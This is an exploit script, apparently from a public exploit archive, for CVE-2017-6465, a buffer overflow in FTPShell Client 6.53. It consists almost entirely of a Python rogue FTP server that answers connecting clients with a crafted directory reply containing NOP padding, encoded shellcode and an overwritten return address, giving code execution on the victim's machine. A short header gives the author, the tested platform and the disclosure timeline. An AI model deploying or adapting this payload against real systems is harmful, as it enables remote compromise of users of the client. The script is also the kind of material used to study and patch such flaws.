# Exploit Title: FTPShell Client 6.53 buffer overflow on making initial connection
# Date: 2017-03-04
# Exploit Author: Peter Baris
# Vendor Homepage: http://www.saptech-erp.com.au
# Software Link: http://www.ftpshell.com/downloadclient.htm
# Version: Windows Server 2008 R2 x64
# Tested on: Windows Server 2008 R2 Standard x64
# CVE: CVE-2017-6465

# 2017-03-04: Software vendor notified
# 2017-03-06: No reply
# 2017-03-06: Publishing

import socket
import sys

shell=("\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\x3f\x9f\xac\x38\x2a\xc9\xbc\xe1\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xc3\xd7\x2f\xdc\xda\x21"
"\x7c\xe1\x3f\x9f\xed\x69\x6b\x99\xee\xb0\x69\xd7\x9d\xea\x4f"
"\x81\x37\xb3\x5f\xd7\x27\x6a\x32\x81\x37\xb3\x1f\xd7\x27\x4a"
"\x7a\x81\xb3\x56\x75\xd5\xe1\x09\xe3\x81\x8d\x21\x93\xa3\xcd"
"\x44\x28\xe5\x9c\xa0\xfe\x56\xa1\x79\x2b\x08\x5e\x0c\x6d\xde"
"\xfd\x70\xa1\x9b\x9c\x6a\x7d\xa3\xe4\x39\xfa\x42\x3c\x69\x3f"
"\x9f\xac\x70\xaf\x09\xc8\x86\x77\x9e\x7c\x68\xa1\x81\xa4\xa5"
"\xb4\xdf\x8c\x71\x2b\x19\x5f\xb7\x77\x60\x65\x79\xa1\xfd\x34"
"\xa9\x3e\x49\xe1\x09\xe3\x81\x8d\x21\x93\xde\x6d\xf1\x27\x88"
"\xbd\x20\x07\x7f\xd9\xc9\x66\xca\xf0\xc5\x37\xda\x95\xe9\x5f"
"\x11\xe4\xa5\xb4\xdf\x88\x71\x2b\x19\xda\xa0\xb4\x93\xe4\x7c"
"\xa1\x89\xa0\xa8\x3e\x4f\xed\xb3\x2e\x41\xf4\xe0\xef\xde\xf4"
"\x79\x72\x97\xe5\xbb\x7e\xc7\xed\x61\x6b\x93\xf4\x62\xd3\xbf"
"\xed\x6a\xd5\x29\xe4\xa0\x66\xc5\xe4\xb3\x38\x20\xeb\x1e\xc0"
"\x60\xf1\x70\x90\xc8\xbc\xe1\x3f\x9f\xac\x38\x2a\x81\x31\x6c"
"\x3e\x9e\xac\x38\x6b\x73\x8d\x6a\x50\x18\x53\xed\x91\x39\x09"
"\x43\x69\xde\x16\x9e\xbf\x74\x21\x1e\xea\xd7\x2f\xfc\x02\xf5"
"\xba\x9d\x35\x1f\x57\xd8\x5f\xcc\x07\xa6\x2c\xed\xc3\x52\x2a"
"\x90\xfd\x68\xe5\x60\x79\x5b\x4b\xa5\xdf\xcf\x5a\xe7\xc9\x38"
"\x2a\xc9\xbc\xe1")

port = 21

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", port))
        s.listen(5)
        print("[i] FTP server started on port: "+str(port)+"\r\n")
except:
        print("[!] Failed to bind the server to port: "+str(port)+"\r\n")



# 004b95dc in ftpshell.exe PUSH ESI ; RETN
eip = "\xdc\x95\x4b"
nops = "\x90"*8 
junk = "A"*(400-len(nops)-len(shell))
buffer = nops + shell + junk + eip

while True:
    conn, addr = s.accept()
    conn.send('220 Welcome to your unfriendly FTP server\r\n')
    print(conn.recv(1024))
    conn.send("331 OK\r\n")
    print(conn.recv(1024))
    conn.send('230 OK\r\n')
    print(conn.recv(1024))
    conn.send('220 "'+buffer+'" is current directory\r\n')
